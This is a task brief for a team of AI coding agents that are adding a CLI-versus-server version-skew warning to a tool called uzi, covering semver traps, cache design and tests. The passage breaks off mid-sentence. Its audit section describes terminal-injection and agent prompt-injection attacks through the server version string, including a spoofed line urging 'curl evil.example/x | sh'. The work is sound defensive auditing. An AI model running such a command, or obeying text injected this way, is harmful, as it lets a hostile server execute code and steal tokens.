# Task brief — issue #144 item 1: warn when the CLI is behind the server

**Worktree**: `/home/user/repos/myorg/vtmocanu/uzi/fix-144-cli-skew`
**Branch**: `fix/144-cli-version-skew`
**Tip when this brief was written**: `2d60c573d9b554618784f99058a8be2a8b986649` (== `main`).
Take the live tip if it has moved past this, and say so rather than guessing.

> **DURABILITY + SWEEP CAVEAT.** This file lives under `.claude/agent-team-tasks/`,
> which is **`.gitignore:52`**. It is **force-added and committed** on this branch, so
> it is durable and survives the worktree — but that makes it *tracked and
> simultaneously invisible to every recursive grep*. `grep -r` will NOT find strings in
> it (ugrep honours ignore files), and **`--hidden` changes nothing** — the path is
> *ignored*, not hidden, which is the wrong axis. Plain `git check-ignore` on it is
> **fail-open** (rc=1, no output); `git check-ignore -v --no-index` names `.gitignore:52`
> at once.
>
> **Any later sweep over this file must use `git grep`**, which reads the index and
> finds it by construction. See `CLAUDE.md`'s entry on this exact trap — it was measured
> on `.claude/agent-team-tasks/prd-103-m2.md`, the spec of the milestone that found it.

---

## Roster

One line per role in `.claude/agents/`. Dispatched with a SHA, or closed with a reason.
Kept current as the run proceeds — this is the durable half of the Step 2 sweep.

| role | disposition |
|---|---|
| architect | **dispatched** at `2d60c573` — design wave |
| reviewer | **dispatched** at `2d60c573` — design-critique wave (citation pass) |
| auditor | **dispatched** at `2d60c573` — design-critique wave (citation pass) |
| coder | pending — spawns against the FROZEN brief after the design wave settles |
| tester | pending — dispatch after the coder's FIRST commit, never at kickoff |
| spec-keeper | pending — `specs/` exists and this adds a CLI behaviour + an env var, so `specs/ai.md` owes an entry. After blocking findings resolve. |
| documenter | pending — `CHANGELOG.md` owes a one-line entry |
| fact-checker | pending — decide after the design wave; its citation ask may already cover the brief's claims |
| release | **closed** — this run ends at an MR. No tag, no release cut. |
| researcher | **closed** — the investigation is already done and written up in §1; there is no open question needing research. |
| web-ux | **closed** — no web surface touched. The web half of this bug was already correct (`RunCredential` rendered both tokens right); the defect is entirely CLI-side. |

---

## 1. What happened, measured 2026-08-03

The user asked why two concurrent uzi runs looked like they were on different
Anthropic tokens while the UI showed the same one. Ground truth, from
`GET /api/runs/<id>` against `https://uzi.example.com` (API `0.14.0`,
commit `2d60c573`):

| run | issue | claimed | `anthropic_secret_label` | `anthropic_select_reason` | headroom |
|---|---|---|---|---|---|
| `edbc3884-ff8c-4f75-bd0f-3ad8833c25a7` | #209 | 12:45:37Z | `meta` | `auto` | 100 |
| `a146df98-aac6-4b59-9333-c3c6799a5bc0` | #78 | 12:30:50Z | `personal` | `default` | null |

The **web UI was correct** — it rendered `token "meta" — auto, 100% headroom`
(screenshot confirmed by the user). `RunCredential` at `web/src/pages/RunView.tsx:524`.

**The CLI was not.** `uzi run get <id> --json` on the then-installed **v0.11.8**
printed `null` for all four of `anthropic_secret_id`, `anthropic_secret_label`,
`anthropic_select_reason`, `anthropic_headroom_pct`, on **both** runs — while raw
`curl` against the identical endpoint returned the values above. After
`brew upgrade uzi-cli` (0.11.8 → 0.14.0) the same commands returned
`{"iid":209,"label":"meta","reason":"auto","headroom":100}` and
`{"iid":78,"label":"personal","reason":"default","headroom":null}`.

So a CLI three minors behind the server **silently drops fields it does not know**,
and nothing anywhere says so. That is the defect.

## 2. This is issue #144 item 1, and it is HALF-DONE

Read `env -u GITLAB_TOKEN glab issue view 144`. Item 1 asks for two things:

> Suggested: `uzi version` (and/or `uzi auth status`) reports **both** binary and
> server version, **and warns when they differ**.

- The **"reports both"** half shipped: PRD #175 M4 added `serverBuildInfo` /
  `serverRows` to `api/cmd/uzi/version.go`. `uzi version` prints the server's
  build info today.
- The **"warns when they differ"** half was never built. `version.go` fetches the
  server version and never compares it to `version`.

Scope of this task is that missing half, plus the delivery decision below.

## 3. Design already settled with the user — do not re-litigate

The user was shown three placements and chose **"every command, cached probe"**,
with this exact preview:

```
$ uzi run get <id> --json
uzi: CLI v0.11.8 is behind server 0.14.0; some
     fields may be missing. Run: brew upgrade uzi-cli
{
  "id": "edbc3884-...",
  ...
}

(warning -> stderr, JSON -> stdout, exit code unchanged)
```

Binding constraints from that choice:

1. **Warning goes to STDERR. Never stdout.** `--json` consumers parse stdout; a
   warning there corrupts every parser. This is the whole reason the option was
   presented that way.
2. **The exit code is unchanged.** A skew warning is not a failure. `ExitCodeFor`
   must see exactly what it sees today.
3. **Cached, not per-command.** A probe on every invocation is unacceptable
   latency. Cache the server's version and re-probe on a TTL (~1h was the figure
   shown to the user; the architect may argue a different one).
4. **The proposal is `brew upgrade uzi-cli`.** That is the only documented install
   path — `Formula/uzi-cli.rb` is the source of truth and release CI publishes it
   into the `vtmocanu/homebrew-tap` tap (verified this session: the tap's `main` is
   at `tag: "v0.14.0"`, CI is healthy, the local clone was merely 8 days stale).
5. **Landing**: a scoped MR against issue #144, no new PRD.

## 4. Facts you will need, each re-derivable

**The semver trap is LIVE here and it fails open.** `uzi version` prints
`v0.14.0` (leading `v`, stamped by `-ldflags -X main.version=v#{version}` in
`Formula/uzi-cli.rb:48`) while `/api/version` returns bare `0.14.0`
(`apitypes.BuildInfoDTO.Version` doc: *"bare — the Dockerfile strips a leading v"*).

**🔴 AMENDED 2026-08-03 (design wave, reviewer N10 + lead re-derivation). THE EXAMPLE
THIS PARAGRAPH ORIGINALLY CARRIED HAD THE WRONG SHAPE, AND THE RIGHT ONE IS WORSE.**
It quoted `CLAUDE.md`'s **both-bare** case, `Compare("0.11.0","0.11.7") == 0`. The live
pair is **one prefixed, one bare**. Measured against `golang.org/x/mod@v0.38.0`, twice
independently (reviewer in a throwaway module, lead re-derived in the scratchpad — all
six rows agreed):

```
Compare("v0.11.8",         "0.14.0")  =  1   IsValid true/false   <- THE LIVE PAIR
Compare("v0.11.8",         "v0.14.0") = -1   IsValid true/true    <- what a fixture "naturally" writes
Compare("0.11.0",          "0.11.7")  =  0   IsValid false/false  <- the both-bare case, wrong shape here
Compare("vdev",            "v0.14.0") = -1   IsValid false/true   <- see B1 below
Compare("v0.14.0",         "vdev")    =  1   IsValid true/false
Compare("v0.14.0+g2d60c57","v0.14.0") =  0   IsValid true/true    <- build metadata is comparison-neutral (§10)
```

**A `< 0` gate on the un-normalised live pair returns `1`, i.e. "the CLI is AHEAD", so
it is SILENT on exactly the bug §1 opens with.** The conclusion (an un-normalised
compare is silently dead) survives; the example did not support it.

**Consequence for the test fixtures, and it is the sentence that makes them
discriminate:** §5's rule *"the fixture must be genuinely BEHIND"* is necessary and
**not sufficient**. A behind-fixture written `("v0.11.8","v0.14.0")` passes against an
implementation that forgets to normalise the **server** side, because the fixture
already normalised it. **The fixture must feed the server version in its bare wire
form (`"0.14.0"`), exactly as `/api/version` serves it.**

- **In-repo precedent that gets it right**: `api/internal/forge/forgejo.go`,
  `checkForgejoVersion` — re-prefix with `v`, guard on `semver.IsValid`, then
  `semver.Compare`.
- `golang.org/x/mod v0.38.0` is **already** in `api/go.mod:22`. No new dependency.
- SemVer §10: build metadata is comparison-neutral, so `v0.14.0+g2d60c57` compares
  equal to `v0.14.0` — which is what we want, and is not the same as string equality.
- **The discriminating test fixture must be genuinely BEHIND.** `Compare(x,x)==0`
  is the right answer from a completely broken comparison, so an all-equal fixture
  set certifies nothing. `.claude/agent-team.md` catalogues this exact case.

**Where the hook goes.** `api/cmd/uzi/root.go` already has the seam:

```go
root.PersistentPreRun = func(cmd *cobra.Command, _ []string) {
    if env.AutoUpgradeSkill && !underSkillCmd(cmd) {
        maybeAutoUpgradeSkill(env)
    }
}
```

`underSkillCmd` (`api/cmd/uzi/skill.go:191`) walks ancestors looking for `skill`.
`maybeAutoUpgradeSkill` (`:204`) is the tone to match: **never fatal, never
blocking**, honours `UZI_SKILL_AUTO_UPGRADE=0`, warns on stderr and returns.

**Where the cache goes.** `uzicli.Store` (`api/internal/uzicli/config.go`) is
rooted at `~/.config/uzi`, **hardcoded and deliberately not XDG** — that file
carries a comment explaining why (on this team `XDG_CONFIG_HOME` points into a
git-tracked mackup repo). Do not add an XDG lookup. `Store.Dir()` is exported.
`env.Store` may be **nil** (no home dir) and every caller tolerates that.

**How the probe should behave.** `serverBuildInfo` in `api/cmd/uzi/version.go` is
the model and its doc comment states the contract: every failure returns nil, the
no-URL case is checked **before** a client is built so the common standalone
invocation makes no network call at all, and `serverProbeTimeout = 2 * time.Second`
exists specifically because `uzi version` runs inside Homebrew's sandboxed
`test do` with no server anywhere — a 30s stall there is a failed release.

**Two gates in `api/cmd/uzi/` that will bite you:**

- `instructions_test.go` — the printed-instruction registry (PRD #98 seam 5). It
  lifts every `uzi …` span out of printed strings via AST and demands a registry
  entry; a RUNTIME instruction's entry is *a claim that the instruction has been
  executed*, and `kindUnknown` **fails**. Read the file's header before you print
  anything. Note the proposed message says `brew upgrade uzi-cli`, not `uzi …` —
  confirm for yourself whether that is in or out of the extractor's scope rather
  than assuming.
- `skill_drift_test.go` — asserts the embedded `SKILL.md` matches the real cobra
  tree. The skill ships **inside** the binary
  (`api/internal/uzicli/skill.go`, `//go:embed skill/SKILL.md`), so CLI↔skill skew
  is structurally impossible; only CLI↔server skew is real. If a new env var is
  added it belongs in `api/internal/uzicli/skill/SKILL.md`'s configuration section
  next to `UZI_SKILL_AUTO_UPGRADE=0`.

**`brew-local-test.sh` constrains stdout, not stderr.** `scripts/brew-local-test.sh`
matches `case "$out" in "v$version"*)` anchored at the start of the **whole**
stdout, which is why `version.go` prints the CLI version first and alone on line
one. A stderr warning does not touch this; a stdout one breaks the release.

## 5. Gate

Run `task gate:api` (fmt-check + vet + build + lint + deadcode + test). Do not
restate its recipe. The lint slot is ratcheted against `origin/main` — if
`origin/main` does not resolve, `git fetch origin main` rather than starting a
burn-down.

`test:api` carries `-race -count=1`. Live-DB tests are not in scope here.

---

## 6. Design-wave findings — AMENDMENT 1, 2026-08-03

Round 1 of the design-critique wave. **Reviewer reported; architect and auditor are
still in flight, so this section is OPEN and will gain an Amendment 2 before the brief
freezes.** The coder is not spawned until it does.

Reviewer's citation pass came back **10 of 10 CONFIRMED** — no claim in §4 was refuted,
and `underSkillCmd:191` / `maybeAutoUpgradeSkill:204` are exact. Three findings are
blocking on the DESIGN.

### B1 — 🔴 THE NAMED PRECEDENT INVERTS THE SAFE DIRECTION, AND THE DEFAULT CLI VERSION IS UNPARSEABLE

`api/cmd/uzi/root.go:16` is `var version = "dev"`. Measured (above): an **invalid**
version sorts BELOW a valid one, so `Compare("vdev","v0.14.0") = -1`.

**The natural rule — warn when `Compare(cli, srv) < 0` — warns on every binary built
with `go build ./cmd/uzi`.** That is every developer running from source, every
`runCLI` test, and the coder's own gate runs, each told to `brew upgrade uzi-cli`.

§4 points at `checkForgejoVersion` as the precedent, and **copying it literally is what
produces the bug**. Forgejo *refuses* on unparseable (`forgejo.go:178-180`), and its own
doc argues refusing is the safer failure mode — true there, because it is a feature gate
at connect time. Here "refuse" maps to "warn", which is the **wrong direction**: a
build-info probe that cannot be parsed must be **SILENT**.

**Binding:** re-prefix BOTH sides, require `semver.IsValid` on BOTH, and state in code
that a failed validity check is silence. The precedent is the *shape* (re-prefix →
IsValid → Compare), not the disposition.

### B2 — 🔴 CACHING ONLY SUCCESSES VIOLATES BINDING CONSTRAINT 3

§3.3 forbids a per-invocation probe. But "cache the server's version" leaves **nothing
to store when the probe fails**, and `serverBuildInfo` returns `nil` for every failure
(`version.go:93/97/107`) without distinguishing "no URL" from "connection refused".

So a user with `UZI_URL` set and the server unreachable — VPN off, offline, compose
stack down, dev cluster restarting — takes a **cache miss on every invocation** and pays
`serverProbeTimeout` (2s) before every command. That is the per-invocation probe
constraint 3 forbids, and it is strictly worse than today, where `serverBuildInfo` is
reached only by an explicit `uzi version`.

**Binding:** the cache must hold a NEGATIVE observation (probe failed at T) with its own
TTL.

### B3 — 🔴 KEY THE CACHE ON THE RESOLVED URL

`resolveSettings` (`root.go:155-174`) lets the URL change per invocation: `--url` beats
`$UZI_URL` beats the config file. An unkeyed cache applies server A's version to server
B — and the warning is a *factual claim about the server you are talking to*. Prod plus
the dev cluster is the normal shape here (`CLAUDE.md`: "we mostly test in k8s now"), not
a corner case.

**Binding:** key on the resolved URL, or store `url → {version, checked_at}`.

### Non-blocking, carried into the implementation

- **N1** Cache the OBSERVATION, never the VERDICT. A cached `skew: true` is not cleared
  by `brew upgrade uzi-cli`, so the user is told to upgrade for up to a TTL *after they
  did*. Storing `{url, server_version, checked_at}` and recomputing against `version`
  each run self-heals, because the CLI side is what changed. Write the reason down or
  someone "optimises" it into a boolean.
- **N2** Put the cache in `uzicli` beside `Store`, not in `main` via `Dir()`:
  `writeFileAtomic` (`config.go:187`) and the 0700 `MkdirAll` discipline are
  **unexported**. Agents run uzi in parallel, so the atomic rename is wanted.
- **N3** "Every command" is not what the seam delivers. Measured against cobra v1.10.2:
  `--help` (`:934`), `--version` (`:945`), a non-runnable command (`:956`) and a failed
  `ValidateArgs` (`:970`) all return **before** the PersistentPreRun loop (`:982`). So
  **`uzi --version` never warns while `uzi version` does.** Decide it deliberately.
- **N4** The seam is single-occupancy: cobra `break`s at the first ancestor with a
  `PersistentPreRun` and `EnableTraverseRunHooks` is unset. This MR makes it a
  two-consumer seam; a future subcommand adding its own hook silently disables BOTH with
  nothing failing. One comment at `root.go:109` closes it.
- **N5** `--quiet` is undecided and the precedent does not answer it —
  `maybeAutoUpgradeSkill` takes no `gf` and ignores it, while 20 other sites honour it.
  `gf.quiet` IS reachable at the hook. Lead's call: **`--quiet` suppresses the warning**
  (it is non-essential output by definition). Implement that.
- **N6** Gate the hook on an `Env` field, true in `DefaultEnv`, false in `fakeEnv` —
  mirroring `AutoUpgradeSkill`. Otherwise every existing command test starts calling
  `FakeClient.BuildInfo`.
- **N7** `e2e/run-e2e.sh:1682`'s `uzi_cli()` sets `UZI_URL`, so the hook probes there.
  The new opt-out env var belongs on that line **in this MR**, beside the existing
  `UZI_SKILL_AUTO_UPGRADE=0`, which sits there for exactly this class of side effect.
  Note the printed-instruction rows assert exact counts over stdout AND stderr
  (`:3293-3296`, `:3355-3360`).
- **N8** `uzi version` would probe twice (`version.go:57` already calls
  `serverBuildInfo`). Exempt it from the hook, or share the cache.
- **N9** The probe carries the bearer token (`client.go:97-112`, gated by
  `credentialSafeBase`). No new exposure class, but it moves credential traffic from
  "once per explicit `uzi version`" to "once per TTL per command stream". Flagged for
  the auditor.
- **N11** A new env var owes **`docs/cli.md`** (which documents `UZI_SKILL_AUTO_UPGRADE`
  at `:547`) as well as `SKILL.md:327`. `skill_drift_test.go` extracts only `--flags`
  and command paths — **env vars are gated by nothing in either direction**, so both
  files are by hand.
- **N12** State the TTL's failure direction: with an observation cache, staleness means
  **server upgraded → no warning for up to a TTL**. Silence-when-you-should-warn, never
  a false warning. That is the argument for 1h; record it so the next reader can tell it
  was reasoned.
- **n1** The proposed message escapes the printed-instruction extractor for a reason one
  character wide, twice: `instructionRE` needs `uzi ` with a SPACE, and the message has
  `uzi:` (colon) and `uzi-cli` (hyphen). Measured, not read. **Rewording it to mention
  `uzi version` re-arms a kindRuntime registry entry** requiring execution evidence.

---

## 7. Design-wave findings — AMENDMENT 2, 2026-08-03 (auditor)

Executed attacks against a scratch build driven at a hostile loopback `/api/version`,
under `env -i` with a fake HOME. Not theory. Architect still in flight; §8 will close.

### 🔴 H1 (HIGH) — THE SINK ALREADY EXISTS ON `main` AND IS ALREADY UNSAFE. THIS DESIGN MULTIPLIES IT.

`version.go:118` puts `b.Version` into a row verbatim; `:74` prints it with `fmt.Fprintf`.
No sanitizer, no cap. Four attacks, all exit 0, all confirmed by `od -c` of real stdout:
`ESC[2J ESC[H` (erase display), **`\r` line-overwrite**, `OSC 8` hyperlink, `U+202E` bidi.

The `\r` one is the sharpest: the rendered line reads **only**
``WARNING: run `curl evil.example/x | sh` to fix`` — uzi's own `server version ` prefix is
erased, so an arbitrary attacker sentence appears to come from uzi.

**The repo already decided this exact class, the strict way.** `run.go:1152-1153` sanitizes
`RateLimitType` **even though the server allowlists it to an enum**, with the comment
*"server-controlled today is exactly the assumption that rots"*. `BuildInfoDTO.Version` has
**no** server-side constraint (`handler.go:399` passes `h.version` straight through —
contrast `Commit`, gated by `isFullSHA`, and `BuiltAt`, gated by `time.Parse`). So Version
is strictly weaker than the field the repo already ruled must be sanitized.

**Why it escalates here, and the AI-specific lens:** today the blast radius is one command
run deliberately. Under a `PersistentPreRun` hook it becomes every invocation of every
command, **on stderr** — and the bundled skill tells agents `read stderr`
(`SKILL.md:43`). A hostile or compromised server therefore lands attacker-authored text
in an agent's context on every uzi call. That is prompt injection through a version
warning.

**`--json` is not a shield**: Go's `json.Marshal` escapes C0 controls but does NOT escape
U+202E; raw bidi rides stdout in JSON mode.

**Precondition:** the attacker controls the endpoint (compromised deployment, or a user or
agent induced to use `--url`/`$UZI_URL`). `credentialSafeBase` forces https off-loopback,
so passive MITM is not a route.

**BINDING — `cellText` (`run.go:950`) every `BuildInfoDTO` string that reaches the warning,
AT PRINT TIME, after the cache read.** Not at fetch, not at cache-write — see H4(c).

### H2 (MEDIUM) — UNBOUNDED. Measured: a 1 MiB version string prints in full, one line, exit 0
`maxRespBytes = 32 << 20` (`client.go:232`) is the only ceiling. Under this design that
lands on stderr of every command AND in the cache file, and is re-read for the whole TTL.
`cellText`'s **200-char cap** fixes H1 and H2 in one edit — which is the argument for
reusing it rather than hand-rolling a control stripper.

### H3 (MEDIUM) — THE ROUTE IS UNAUTHENTICATED; THE REQUEST IS NOT
Verified by execution with a canary token, not by reading. The route is genuinely
unauthenticated (`handler.go:446`, outside `RequireAuth`, `noLimiter`). **The request
carries `Authorization: Bearer uzc_…`.**

So these commands, which make **no network call today**, would start shipping the user's
token on every invocation:
- **`uzi logout`** (`login.go:179-199` — `env.Store` only) — ships the token to the server
  on the way to deleting it.
- **`uzi auth token`** (`auth.go:31-49` — reads a credential from stdin, no client) — a
  command built so *"a credential must never land on argv"* would emit a request carrying
  the **previous** credential.

**§4's model breaks here:** `maybeAutoUpgradeSkill` is a purely LOCAL filesystem operation.
The probe would be the first network call in `PersistentPreRun`, so "match its tone"
transfers the failure-handling shape but **not** the risk profile.

**BINDING:** probe-exempt the local-only commands the way `underSkillCmd` exempts `skill`.
**Do NOT strip the `Authorization` header to make the probe truly unauthenticated** — that
removes the stated justification for `credentialSafeBase` on this path and re-opens
`uzi … --url http://…` as a token leak.

### H4 (MEDIUM) — CACHE KEYING, and one sub-finding is a NEW credential-write path
- **(a) Unkeyed = cross-endpoint poisoning.** One `--url https://hostile` populates the
  cache; every later invocation against the real server prints the attacker's string until
  the TTL expires. (Independently the reviewer's B3.)
- **(b) Keying on the RAW URL writes credentials to a 0644 file.** `credentialSafeBase`
  does not strip userinfo. Executed: `--url 'http://alice:hunter2@127.0.0.1:…'` → exit 0,
  served. Control: after **eight** `--url` invocations the scratch home held only the
  seeded `credentials.toml` and **no `config.toml`** — a `--url` base is never persisted
  today outside `uzi login`. The cache would be the **first** write path that persists it,
  and `SaveConfig`'s precedent is **0644**. → key on a **hash** of the URL, or the context
  name. Never the raw string.
- **(c) Sanitize on READ, not on WRITE.** A write-time sanitizer is bypassed by the cache
  file itself — a plain file with no integrity protection, so anything that can write it
  controls the warning text with **no network involvement**. Treat the cache as exactly as
  untrusted as the network response.
- **Reuse `writeFileAtomic` (`config.go:186`)** — `os.CreateTemp` (0600) → `Chmod` →
  `os.Rename`, and rename replaces a symlink rather than following it. A hand-rolled
  `os.WriteFile` would follow a symlink and **would be a real vulnerability**. Do NOT copy
  `LoadCredentials`' refuse-on-wide-perms guard: the right property for a cache is
  distrust-on-read, not refuse-on-read.

### H5 (LOW) — `/api/version` has NO rate limiter (`route_limiter_mounts_test.go:203`)
Unauthenticated, unlimited, about to be called by every CLI invocation from every user and
agent. **The TTL is the load-bearing mitigation, so this grade moves if the TTL moves.**

### Ungraded mechanisms, carried
- **Silence is ambiguous.** Every error maps to nil, so "no warning" cannot distinguish
  *agree* from *the probe never ran*. Cache a negative distinctly from a positive.
  (Converges with reviewer B2 from the other direction.)
- **A cached verdict outlives its condition.** After `brew upgrade uzi-cli` the new binary
  reads the old entry and warns (or stays silent) wrongly for the rest of the TTL.
  **Include the CLI's own version in the cache entry and invalidate when it changes**, not
  only on the TTL.
- **`serverProbeTimeout = 2s` is per-REQUEST, not a per-invocation budget.** It reads like
  a total and is not. `refuseRedirect` (`client.go:272`) already blocks redirect
  amplification.

### 🔴 TOOLCHAIN CONSTRAINT discovered by the security scan — binds the implementation
The repo's security-scan slot is `none (gap, noted 2026-07-21)` (`agent-team.md:1506`), so
the auditor substituted its own tools and labelled that. `gitleaks` on `2d60c573..2ab304c3`:
clean. `govulncheck` on `./cmd/uzi/... ./internal/uzicli/...`: **two PRE-EXISTING vulns,
neither introduced here** (`GO-2026-5970` x/text infinite-loop; `GO-2026-5320` goldmark XSS).

**The x/text trace runs through `uzicli.Printer.Println` (`output.go:169`).** `version.go`
uses plain `fmt.Fprintln`/`Fprintf`, so the version path does not reach it today.
**It becomes reachable if the implementer routes the new warning through `uzicli.Printer`.**
→ **Print the warning with `fmt.Fprintf(env.Stderr, …)`. Do NOT use `Printer`.**

### Test fixture, binding (auditor item 5)
A well-formed `0.11.8` passes against a **completely unsanitized** implementation. The
discriminating inputs are `\r`, `ESC[2J`, `U+202E`, and a 1 MiB version. Include all four.

---

## 8. USER SCOPE DECISIONS — 2026-08-03, binding

Asked after Amendment 2, because the auditor's H1/H2 are **pre-existing on `main`** and
not caused by this work. Both answers widen the scope beyond the lead's recommendation;
both are the user's call and are binding.

### D1 — The terminal-injection fix lands FOLDED IN, as ONE commit

The lead recommended a separate commit in the same MR so the security fix stayed
independently cherry-pickable to a patch release. **The user chose one commit.**
Recorded consequence, stated once and not re-litigated: **the sanitizer cannot be
cherry-picked to a release branch without the feature.** Implement as a single coherent
change.

### D2 — The two pre-existing dependency vulns are bumped IN THIS MR

- `GO-2026-5970` — `golang.org/x/text` **v0.38.0 → v0.39.0** (infinite loop on invalid
  input; reachable via `uzicli/output.go:169` `Printer.Println`)
- `GO-2026-5320` — `github.com/yuin/goldmark` **v1.7.8 → v1.7.17** (XSS; reachable via
  `cmd/uzi/tui_render.go:64` → glamour → `html.Renderer`)

Neither is introduced by this branch. The lead recommended filing an issue instead;
the user chose to bump here.

**Notes for whoever does it:** goldmark is pulled through **glamour** (the TUI markdown
renderer), so the bump is not necessarily a leaf change — check whether glamour pins it
and whether the TUI render tests (`tui_render_test.go`) still pass. Re-run `govulncheck`
after the bump and paste the output; **a clean `go build` is not evidence the vuln is
gone**, and `govulncheck` exiting 3 vs 0 is the check. Both modules' gates must stay
green (`task gate:api`; `controller/` has its own `go.mod` and is not affected unless the
bump reaches it — verify rather than assume).

**Scope boundary that did NOT move:** this remains a scoped MR against issue #144. No new
PRD. Nothing else gets swept in — if the dep bump cascades into unrelated churn, stop and
report rather than widening further.

---

## 9. AMENDMENT 4 — architect's design, one conflict ruling, and the FREEZE

Full design: `.claude/agent-team-tasks/144-design.md` (architect). Its citation pass was
**8 of 8 CONFIRMED**, independently of the reviewer's 10 of 10. Read it — the eight
settled points below are the short form, not a replacement.

### 🔴 THE SEMVER DEFECT IS NOT "WRONG ON SOME PAIRS". IT IS **INERT**.

The architect measured against this project's real shipped shapes rather than inheriting
CLAUDE.md's example, and the result is stronger than anything in §4. Lead re-derived it
over a 5×5 grid of realistic pairs:

```
rows = 25   rows where Compare(cli, srv) < 0, i.e. would warn = 0
```

**Zero. `cli=v0.1.0` against `srv=99.0.0` — 98 majors behind — still returns +1.** The
CLI is always the valid operand and the server always the invalid one, so an
un-normalised `< 0` gate **can never fire, for anyone, ever**. §4 said it was silent on
the live pair; it is silent on the entire input space.

**AND THE TWO FAILURE MODES SIT AT DIFFERENT STAGES, IN OPPOSITE DIRECTIONS.** This is
the thing to get right:

| stage | implementation | behaviour |
|---|---|---|
| 0 | naive `Compare(cli, srv) < 0` | **INERT** — never warns (25/25 above) |
| 1 | re-prefix BOTH sides, no `IsValid` guard | **OVER-FIRES** — `Compare("vdev","v0.14.0") = -1`, so every `go build` binary is told to `brew upgrade` |
| 2 | re-prefix + `IsValid` on BOTH + silent on invalid | correct |

So **B1 bites the fix, not the bug.** An implementer who adds normalisation without the
guard moves from never-warns to always-warns-in-dev. A test suite that only proves
"it warns when behind" passes at stage 1.

### CONFLICT RULING — `logout` and `auth token` ARE probe-exempt

The architect and the auditor disagreed, and this is the lead settling it rather than
averaging it.

- **Architect**: *"`login`/`auth token` are not exempt (endpoint is unauth)."*
- **Auditor**: measured, with a canary token, that the **request carries
  `Authorization: Bearer uzc_…`** even though the route is unauthenticated.

They answered two different questions — *is the ROUTE authenticated?* (no) and *does the
REQUEST carry the credential?* (yes). Only the second bears on the exemption. **The
architect's own citation pass states the token is carried**, so its conclusion
contradicts its own evidence; the execution wins.

Lead re-derived both commands at `1279efd8`: `logout` (`login.go:184-200`) and
`auth token` (`auth.go:31-49`) are **pure `env.Store` operations — no `env.client`, no
network**. And `logout`'s own `Short` reads *"Remove the locally stored CLI credential
**(does not revoke it server-side)**"* — a probe there would make it contact the server,
contradicting its documented contract.

**BINDING: exempt `logout` and `auth token`.** Note the command sets differed — the
architect wrote `login`, the auditor `logout`. **`uzi login` is already on the network**
(device-auth flow) and needs no exemption; the exempt pair is `logout` + `auth token`.

### The architect's eight settled points, short form

1. **Boundary** — `api/internal/uzicli/versioncheck.go` = pure comparison + cache (no
   cobra, no I/O, **no `time.Now()`** in the library); `api/cmd/uzi/versioncheck.go` =
   hook + exemptions, reusing the **existing** `serverBuildInfo` rather than a second
   probe function.
2. **Cache** — `~/.config/uzi/version-check.json`, 0644, atomic write, keyed on a **map
   of normalised base URL**. Stores the last **attempt** (empty version = probe failed),
   and the **server's version, never the verdict**. Nil store → skip. Corrupt → miss.
   Future timestamp → not fresh. Write failure → silent.
3. **TTL 1h**, with the argument: too-long only delays hearing about a *server* upgrade;
   the CLI-upgrade direction is instant by (2).
4. **Exemptions** — `skill` subtree, `__complete`/`__completeNoDesc`, `completion`, plus
   the ruling above. **`uzi version` is RELOCATED, not exempt**: it warns inline from its
   own live probe, because `PersistentPreRun` runs *before* `RunE` and a cached warning
   would visibly contradict the `server version` line printed later in the same
   invocation. `--help`, `--version` and non-runnable parents need no exemption — cobra
   returns above the hook loop (`command.go:918-993`).
5. **Message clears the extractor with zero new registry entries** — established by
   reading `instructionRE`, matching the reviewer's independent measurement. Two rules:
   never name a `uzi <verb>` in this message, and **if a test reddens, reword — never
   register**.
6. **`UZI_VERSION_CHECK=0`**, same `== "0"` test as `UZI_SKILL_AUTO_UPGRADE`.
7. **Tests** — assert both channels explicitly; pin `--json` by asserting
   `json.Unmarshal(stdout)` **succeeds** rather than by a negative string check (this
   repo has a documented vacuous-negative case); pin the exit code **differentially**
   (same invocation, check on vs off, equal codes) on a success path *and* a 404 path,
   never hardcoded to 0. Needs a `BuildInfoCalls` counter on `FakeClient`, without which
   the no-double-probe and cache-hit claims are **unobservable**.
8. **Declined** — no `--check` flag, no `uzi upgrade`, no server-is-behind warning, no
   background probe, no `api/internal/verscmp` extraction (a third `normSemver` copy is
   accepted; extracting it would touch `forge` and `workersvc` inside an issue-scoped MR).

### Lead decisions on the architect's two open questions

Both had sensible defaults; neither needed the user.

- **One line.** The two-line hanging indent in the user-facing preview was a **mockup
  wrap, not a spec**. Every other stderr warning in this package is one line, and
  hard-wrapping is wrong at every width but one.
- **Document `UZI_VERSION_CHECK=0` in BOTH `SKILL.md` and `docs/cli.md`**, framing the
  warning as actionable. An undocumented escape hatch is worse than a documented one:
  agents can read it out of the source either way, and only the user loses by not knowing
  it exists. Note `skill_drift_test.go` gates **neither** file for env vars (reviewer
  N11) — both are by hand.

---

# 🔒 THE BRIEF IS FROZEN AS OF THIS AMENDMENT (`1279efd8` + this commit)

Design wave closed: architect, reviewer, auditor, all three citation passes clean, three
blocking design findings and one HIGH resolved into bindings above. The coder spawns
ONCE against this text.

**From here, a DESIGN change is a new wave, not a message.** A pre-flag (a finding the
coder can absorb without re-deciding anything) may still be forwarded mid-implementation.
Anything that re-decides something already built on gets an Amendment 5 and an explicit
"work in flight is invalidated".

Outstanding and NOT blocking the freeze: the fact-checker is still ruling on whether
`CLAUDE.md`'s *"EVERY VERSION THIS PROJECT SHIPS IS BARE"* is itself wrong. That is a
**doc** question about `CLAUDE.md`, not a design question — the measurements this brief
relies on are already independent of it, taken from the shipped stamps directly.

---

## 10. AMENDMENT 5 — CLAUDE.md correction, user-approved 2026-08-03

**🔴 THIS DOES NOT TOUCH THE CODER'S SCOPE AND INVALIDATES NOTHING IN FLIGHT.** It is
DOCUMENTER work, queued behind the coder's first commit so the worktree keeps exactly one
writer. The frozen design in §9 is unchanged.

### The finding

`CLAUDE.md:166` opens **"EVERY VERSION THIS PROJECT SHIPS IS BARE"**. REFUTED by the
fact-checker, re-derived by the lead. **4 of 17 stamp/declaration sites carry the `v`**:
the CLI binary (`Formula/uzi-cli.rb:48`), git release tags, the tap formula's `tag:` pin,
and `uzi version`'s own output. The `v` is **release-gated, not incidental** —
`scripts/brew-local-test.sh:73` matches `"v$version"*` and fails the release if the CLI
stamp is bare.

**It was false when written**, verified by the lead:

| | |
|---|---|
| `Formula/uzi-cli.rb` `v` stamp lands | `17c04352`, **2026-07-17** (PRD #64 M4) |
| the CLAUDE.md headline lands | `e7a0cc1f`, **2026-07-26** ("migrate two repo-general rules out of PRD #113's ephemeral design doc") |

The source is `prds/113-worker-upgrade-status.md:210`, where the sentence is **TRUE**
because PRD #113's scope is the worker fleet — api image, chart, agent image, all bare.
**The migration promoted a scope-true claim to a repo-general one without re-deriving its
scope**, and widened it explicitly with *"Not PRD-specific; any future version comparison
